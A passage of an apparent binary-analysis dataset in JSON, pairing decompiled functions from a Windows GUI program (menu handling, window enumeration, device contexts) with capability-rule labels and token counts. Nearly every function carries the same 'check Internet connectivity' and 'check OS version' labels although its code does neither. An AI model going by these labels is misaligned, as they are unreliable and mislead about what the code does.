    "0045107c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0045107c(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x484858 + 0xd) != '\\0') && (*(in_EAX + 0x30) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 67
    },
    "004510f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid __cdecl fcn.004510f0(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint16_t in_DX;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    puStack32 = &var_2h + 2;\n    uStack36 = 0x4511c5;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    if ((in_DX & 0x10) == 0) {\n        iVar1 = fcn.004508a8();\n        if ((iVar1 != 0) && (iVar2 = fcn.0044f454(),  in_ECX < iVar2)) {\n            iVar1 = fcn.0044f464();\n        }\n    }\n    else {\n        puStack32 = &var_2h + 2;\n        sub.user32.dll_GetSubMenu();\n        iVar1 = fcn.004508a8();\n        uStack48 = in_EAX;\n    }\n    if ((iVar1 != 0) && (*(iVar1 + 0x30) != 0)) {\n        fcn.004047b0();\n        fcn.004047b0(0);\n        iVar1 = fcn.00408ab8();\n        if (iVar1 == 0) {\n            fcn.00451fe8();\n        }\n    }\n    *in_FS_OFFSET = uStack48;\n    uStack40 = 0x4511cc;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 416
    },
    "004511d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004511d8(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_18h;\n    uint32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(param_2 + 0xc) = 0;\n    var_ch = 0xffffffff;\n    var_10h = 0xffffffff;\n    var_14h = 0xffffffff;\n    iVar3 = sub.user32.dll_GetMenuItemCount(*(param_2 + 8));\n    if (-1 < iVar3 + -1) {\n        uVar5 = 0;\n        var_18h = iVar3;\n        do {\n            uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n            cVar2 = fcn.00451094(uVar4 & 0xffffff00 | *(param_2 + 4), &stack0xfffffffc);\n            uVar1 = var_10h;\n            if (cVar2 != '\\0') {\n                if ((uVar4 & 2) == 0) {\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                else if (var_ch < 0) {\n                    var_ch = 0xfffffffe;\n                }\n            }\n            var_10h = uVar1;\n            uVar5 = uVar5 + 1;\n            var_18h = var_18h + -1;\n        } while (var_18h != 0);\n    }\n    if (var_ch < -1) {\n        *(param_2 + 0xc) = 0x10000;\n    }\n    else {\n        if ((var_ch < 0) && (-1 < iVar3 + -1)) {\n            uVar5 = 0;\n            var_18h = iVar3;\n            do {\n                uVar4 = sub.user32.dll_GetMenuState(*(param_2 + 8), uVar5, 0x400);\n                cVar2 = fcn.004510f0(uVar4 & 0xffffff00 | *(param_2 + 4), &stack0xfffffffc);\n                uVar1 = var_10h;\n                if (cVar2 != '\\0') {\n                    if ((uVar4 & 2) != 0) {\n                        *(param_2 + 0xc) = 0x10000;\n                        return;\n                    }\n                    if (var_ch < 0) {\n                        *(param_2 + 0xc) = 2;\n                        var_ch = uVar5;\n                    }\n                    else {\n                        *(param_2 + 0xc) = 3;\n                    }\n                    uVar1 = uVar5;\n                    if (((uVar4 & 0x80) == 0) && (uVar1 = var_10h,  -1 < var_10h)) {\n                        var_14h = uVar5;\n                    }\n                }\n                var_10h = uVar1;\n                uVar5 = uVar5 + 1;\n                var_18h = var_18h + -1;\n            } while (var_18h != 0);\n        }\n        if (*(param_2 + 0xc) == 2) {\n            *(param_2 + 0xc) = var_ch | 0x20000;\n        }\n        else if (*(param_2 + 0xc) == 3) {\n            if (var_14h < 0) {\n                var_14h = var_ch;\n            }\n            *(param_2 + 0xc) = var_14h | 0x30000;\n        }\n    }\n    return;\n}\n",
        "token_count": 954
    },
    "00451350": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00451350(uint uFlags, uint cchMax, uchar *lpString)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t var_4h;\n    \n    cVar1 = fcn.00450a2c();\n    if (cVar1 == '\\0') {\n        uVar4 = sub.user32.dll_GetMenuStringA();\n    }\n    else {\n        var_4h = 0;\n        uVar2 = sub.user32.dll_GetMenuState();\n        if ((uVar2 & 0x10) == 0) {\n            iVar3 = sub.user32.dll_GetMenuItemID();\n            if (iVar3 != -1) {\n                var_4h = fcn.004508a8();\n            }\n        }\n        else {\n            sub.user32.dll_GetSubMenu();\n            var_4h = fcn.004508a8();\n        }\n        if (var_4h == 0) {\n            uVar4 = 0;\n        }\n        else {\n            *lpString = 0;\n            fcn.00409350();\n            uVar4 = fcn.0040928c();\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 277
    },
    "0045141c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0045141c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        iVar1 = fcn.0043a70c();\n        if (iVar1 != 0) {\n            fcn.004513f8();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00451444": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00451444(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x41) != '\\0') {\n        fcn.004039dc();\n        fcn.004513f8();\n        *(in_EAX + 0x41) = 1;\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "004514d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004514d0(uint32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t in_ECX;\n    uint var_4h;\n    \n    uVar2 = in_EAX;\n    if (*(in_EAX + 0x38) != 0) {\n        uVar1 = fcn.00450e54();\n        uVar2 = uVar1;\n        if (in_ECX == 0) {\n            uVar2 = sub.user32.dll_SendMessageA(*(in_EAX + 0x38), 0xb015, 0, 0);\n        }\n        if (uVar1 != '\\0') {\n            uVar2 = sub.user32.dll_DrawMenuBar(*(in_EAX + 0x38));\n        }\n    }\n    fcn.00450fcc(uVar2 & 0xffffff00 | arg_8h & 0xff);\n    return;\n}\n",
        "token_count": 219
    },
    "00451690": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451690(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    uchar *puVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack120;\n    uint uStack116;\n    uchar *puStack112;\n    uint32_t uStack104;\n    uint uStack100;\n    uchar *puStack96;\n    uint32_t uStack92;\n    uint32_t uStack88;\n    uchar *puStack84;\n    uchar *puStack80;\n    uint32_t uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_dh;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack68 = &stack0xfffffffc;\n    uStack72 = 0x451bc3;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar9 = *param_2;\n    if (iVar9 < 0x112) {\n        if (iVar9 == 0x111) {\n            iVar9 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar9 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x45170e;\n                    fcn.0041c4c8();\n                    puStack80 = 0x451717;\n                    cVar3 = fcn.00450948();\n                    if (cVar3 != '\\0') goto code_r0x00451bad;\n                    iVar9 = iVar9 + -1;\n                    puVar2 = puStack68;\n                } while (iVar9 != 0);\n            }\n        }\n        else if (iVar9 == 0x2b) {\n            uVar8 = param_2[2];\n            iVar9 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar9 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x451921;\n                    fcn.0041c4c8();\n                    puStack80 = 0x45192e;\n                    iVar10 = fcn.004508a8();\n                    if (iVar10 != 0) {\n                        puStack80 = 0x451947;\n                        fcn.00426a54();\n                        puStack84 = 0x4519f6;\n                        uStack88 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa8;\n                        uStack92 = *(uVar8 + 0x18);\n                        puStack96 = 0x451964;\n                        puStack80 = &stack0xfffffffc;\n                        uVar6 = sub.gdi32.dll_SaveDC();\n                        uStack100 = 0x4519d9;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack96 = &stack0xfffffffc;\n                        fcn.004270cc();\n                        fcn.00426f6c();\n                        uVar8 = uVar8 & 0xffff0000 | *(uVar8 + 0x10);\n                        puStack112 = 0x4519b1;\n                        fcn.00451e68(uVar8);\n                        *in_FS_OFFSET = uVar8;\n                        uStack100 = 0x4519e0;\n                        uStack104 = 0x4519c8;\n                        fcn.004270cc();\n                        puStack112 = 0x4519d8;\n                        uStack104 = uVar6;\n                        sub.gdi32.dll_RestoreDC();\n                        return;\n                    }\n                    iVar9 = iVar9 + -1;\n                    puVar2 = puStack68;\n                } while (iVar9 != 0);\n            }\n        }\n        else if (iVar9 == 0x2c) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x451a2c;\n                    fcn.0041c4c8();\n                    puStack80 = 0x451a39;\n                    piVar4 = fcn.004508a8();\n                    if (piVar4 != NULL) {\n                        puStack80 = *(in_EAX + 0x10);\n                        puStack84 = 0x451a52;\n                        uVar6 = sub.user32.dll_GetWindowDC();\n                        uStack88 = 0x451b39;\n                        uStack92 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffffa4;\n                        puStack96 = 0x451a6f;\n                        puStack84 = &stack0xfffffffc;\n                        fcn.00426a54();\n                        uStack100 = 0x451b14;\n                        uStack104 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff98;\n                        puStack112 = 0x451a89;\n                        puStack96 = &stack0xfffffffc;\n                        uVar7 = sub.gdi32.dll_SaveDC();\n                        uStack116 = 0x451af7;\n                        uStack120 = *in_FS_OFFSET;\n                        *in_FS_OFFSET = &stack0xffffff88;\n                        puStack112 = &stack0xfffffffc;\n                        fcn.004270cc();\n                        fcn.00426f6c();\n                        uVar8 = iVar9 + 0x10;\n                        (**(*piVar4 + 0x38))();\n                        *in_FS_OFFSET = uVar8;\n                        uStack116 = 0x451afe;\n                        uStack120 = 0x451ae9;\n                        fcn.004270cc();\n                        uStack120 = uVar7;\n                        sub.gdi32.dll_RestoreDC(uVar6);\n                        return;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n        else if (iVar9 == 0x53) {\n            iVar9 = param_2[2];\n            iVar10 = *(in_EAX + 8);\n            puStack68 = &stack0xfffffffc;\n            puVar2 = &stack0xfffffffc;\n            if (-1 < iVar10 + -1) {\n                do {\n                    puStack68 = puVar2;\n                    puStack80 = 0x45181f;\n                    piVar4 = fcn.0041c4c8();\n                    puStack80 = 0x451824;\n                    iVar5 = (**(*piVar4 + 0x34))();\n                    if (iVar5 == *(iVar9 + 0xc)) {\n                        puStack80 = 0x451836;\n                        iVar5 = fcn.0041c4c8();\n                        unique0x00007a00 = *(iVar5 + 0x34);\n                    }\n                    else {\n                        puStack80 = 0x451848;\n                        fcn.0041c4c8();\n                        puStack80 = 0x451855;\n                        *NULL = fcn.004508a8();\n                    }\n                    if (stack0xfffffff0 != 0) {\n                        puStack80 = 0x45186c;\n                        fcn.0041c4c8();\n                        puStack80 = 0x451879;\n                        iVar9 = fcn.004508d8();\n                        if (iVar9 == 0) {\n                            puStack80 = 0x451887;\n                            fcn.0041c4c8();\n                            puStack80 = 0x451894;\n                            fcn.004508d8();\n                        }\n                        if (*(**0x484828 + 0x6c) != 0) {\n                            if ((*(*(**0x484828 + 0x6c) + 0x228) & 8) == 0) {\n                                puStack80 = 0x4518ed;\n                                fcn.0045d8a4();\n                            }\n                            else {\n                                puStack80 = 0x4518da;\n                                fcn.0045d92c();\n                            }\n                        }\n                        goto code_r0x00451bad;\n                    }\n                    iVar10 = iVar10 + -1;\n                    puVar2 = puStack68;\n                } while (iVar10 != 0);\n            }\n        }\n    }\n    else if (iVar9 == 0x117) {\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x451744;\n                fcn.0041c4c8();\n                puStack80 = 0x45174c;\n                cVar3 = fcn.00450964();\n                if (cVar3 != '\\0') goto code_r0x00451bad;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    else if (iVar9 == 0x11f) {\n        uVar1 = *(param_2 + 6);\n        iVar9 = *(in_EAX + 8);\n        puStack68 = &stack0xfffffffc;\n        puVar2 = &stack0xfffffffc;\n        if (-1 < iVar9 + -1) {\n            do {\n                puStack68 = puVar2;\n                if (((uVar1 & 0x10) != 0) && (param_2[2] != 0)) {\n                    puStack80 = *(param_2 + 1);\n                    uStack88 = 0x451791;\n                    uStack76 = param_2[2];\n                    sub.user32.dll_GetSubMenu();\n                }\n                puStack80 = 0x4517b0;\n                fcn.0041c4c8();\n                puStack80 = 0x4517bb;\n                iVar10 = fcn.004508a8();\n                if (iVar10 != 0) {\n                    puStack80 = 0x4517d2;\n                    fcn.0043a990();\n                    puStack80 = 0x4517e1;\n                    fcn.0045dc20();\n                    goto code_r0x00451bad;\n                }\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n        puStack80 = 0x4517f8;\n        fcn.0045dc20();\n    }\n    else {\n        puStack68 = &stack0xfffffffc;\n        if ((iVar9 == 0x120) &&\n           (iVar9 = *(in_EAX + 8),  puStack68 = &stack0xfffffffc,  puVar2 = &stack0xfffffffc,  -1 < iVar9 + -1)) {\n            do {\n                puStack68 = puVar2;\n                puStack80 = 0x451b62;\n                piVar4 = fcn.0041c4c8();\n                puStack80 = 0x451b6d;\n                iVar10 = (**(*piVar4 + 0x34))();\n                if (iVar10 == param_2[2]) {\ncode_r0x00451b83:\n                    puStack80 = 0x451b8d;\n                    fcn.004511d8();\n                    goto code_r0x00451bad;\n                }\n                puStack80 = 0x451b7f;\n                iVar10 = fcn.004508a8();\n                if (iVar10 != 0) goto code_r0x00451b83;\n                iVar9 = iVar9 + -1;\n                puVar2 = puStack68;\n            } while (iVar9 != 0);\n        }\n    }\n    puStack80 = param_2[2];\n    puStack84 = param_2[1];\n    uStack88 = *param_2;\n    uStack76 = *(in_EAX + 0x10);\n    puStack96 = 0x451baa;\n    iVar9 = sub.user32.dll_DefWindowProcA();\n    param_2[3] = iVar9;\ncode_r0x00451bad:\n    *in_FS_OFFSET = uStack76;\n    puStack68 = 0x451bca;\n    uStack72 = 0x451bc2;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 2921
    },
    "00451bd4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00451bd4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 8) == 0) {\n        uVar1 = fcn.00423ef8(fcn.00451644, in_EAX);\n        *(in_EAX + 0x10) = uVar1;\n    }\n    fcn.0041c358();\n    return;\n}\n",
        "token_count": 96
    },
    "00451bfc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00451bfc(void)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0041c688();\n    if (*(in_EAX + 8) == 0) {\n        fcn.00423fac();\n    }\n    return;\n}\n",
        "token_count": 59
    },
    "00451ce4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00451ce4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x484858 + 0xd) != '\\0') && (*(in_EAX + 0x41) != '\\0')) {\n        iVar1 = fcn.0044ca18();\n        if (iVar1 == 0) {\n            fcn.004513f8();\n            *(in_EAX + 0x41) = 1;\n        }\n        else {\n            fcn.004513f8();\n            *(in_EAX + 0x41) = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 144
    },
    "00451d2c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00451d2c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (*(*0x484858 + 0xd) != '\\0') {\n        if (*(in_EAX + 0x41) == '\\0') {\n            uVar2 = *(in_EAX + 0x30) == '\\x01';\n        }\n        else {\n            iVar1 = fcn.0044ca18();\n            if (iVar1 == 0) {\n                uVar2 = fcn.0045c30c();\n            }\n            else {\n                uVar2 = fcn.00403a28();\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 174
    },
    "00451f50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451f50(uint param_1, int32_t *param_2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    fcn.0040461c();\n    iVar3 = 1;\n    do {\n        iVar2 = fcn.00404888();\n        if (iVar2 < iVar3) {\n            return;\n        }\n        uVar1 = *(*param_2 + -1 + iVar3);\n        if ((*(*0x48483c + (uVar1 >> 3)) >> (uVar1 & 7) & 1) == 0) {\n            if (uVar1 == 0x26) {\n                if ((*(*0x484858 + 0xc) != '\\0') && (1 < iVar3)) {\n                    iVar2 = fcn.00404888();\n                    if ((1 < iVar2 - iVar3) && ((*(*param_2 + -2 + iVar3) == '(' && (*(*param_2 + 1 + iVar3) == ')'))))\n                    {\n                        fcn.00404b28();\n                        goto code_r0x00451fd6;\n                    }\n                }\n                fcn.00404b28();\n            }\n        }\n        else {\n            iVar3 = iVar3 + 1;\n        }\ncode_r0x00451fd6:\n        iVar3 = iVar3 + 1;\n    } while( true );\n}\n",
        "token_count": 317
    },
    "00454194": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454194(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *piStack16;\n    \n    piStack16 = in_EAX;\n    if (in_EAX != NULL) {\n        do {\n            iVar1 = sub.user32.dll_IsWindow(piStack16[1]);\n            if (iVar1 != 0) {\n                sub.user32.dll_EnableWindow(piStack16[1], 0xffffffff);\n            }\n            piStack16 = *piStack16;\n            fcn.00402b44();\n        } while (piStack16 != NULL);\n    }\n    return;\n}\n",
        "token_count": 139
    },
    "004541e4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004541e4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h != *0x483e18) && (arg_8h != *(*0x485b48 + 0x30))) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = sub.user32.dll_IsWindowEnabled(arg_8h);\n            if (iVar1 != 0) {\n                uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n                if ((uVar2 & 8) == 0) {\n                    if (*0x483e1c == 0) {\n                        *0x483e1c = arg_8h;\n                    }\n                }\n                else if (*0x483e20 == 0) {\n                    *0x483e20 = arg_8h;\n                }\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 235
    },
    "00454248": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00454248(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    *0x483e1c = 0;\n    *0x483e20 = 0;\n    *0x483e18 = in_EAX;\n    uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.004541e4, 0);\n    sub.user32.dll_EnumThreadWindows(uVar1);\n    if (*0x483e1c != 0) {\n        return *0x483e1c;\n    }\n    return *0x483e20;\n}\n",
        "token_count": 135
    },
    "00454644": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454644(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x18) == '\\0') {\n        cVar1 = fcn.004547fc();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0043deb0();\n            if (cVar1 == '\\0') {\n                fcn.00454d54();\n            }\n            else {\n                fcn.00454d54();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 123
    },
    "0045467c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045467c(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        cVar1 = *(in_EAX + 0x5b);\n        if ((cVar1 == '\\0') || (cVar1 == '\\x03')) {\n            if ((*(in_EAX + 0x5b) == '\\x03') || (*0x4546e4 == (*0x4546e0 & *(in_EAX + 0x61)))) {\n                uVar2 = fcn.0042d70c();\n                *(arg_8h + -4) = uVar2;\n            }\n        }\n        else if (cVar1 == '\\x04') {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x48);\n        }\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "004546e8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004546e8(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        if (*(in_EAX + 0x5b) < 2) {\n            if ((*(in_EAX + 0x5b) == '\\x01') || (*0x45474c == (*0x454748 & *(in_EAX + 0x61)))) {\n                uVar1 = fcn.0042d70c();\n                *(arg_8h + -4) = uVar1;\n            }\n        }\n        else if (*(in_EAX + 0x5b) == 2) {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x4c);\n        }\n    }\n    return;\n}\n",
        "token_count": 208
    },
    "00454750": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00454750(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 4) + 0x84) != '\\0') {\n        cVar1 = (**(**(in_EAX + 4) + 200))();\n        if (cVar1 == '\\0') {\n            fcn.00454e8c();\n        }\n        else {\n            iVar2 = fcn.00440d74();\n            if (-1 < iVar2 + -1) {\n                do {\n                    if (*(in_EAX + 0x18) == '\\0') {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.00440d38();\n                        fcn.0045467c(puVar3);\n                    }\n                    else {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.00440d38();\n                        fcn.004546e8(puVar3);\n                    }\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            fcn.00454e8c();\n        }\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "004547fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
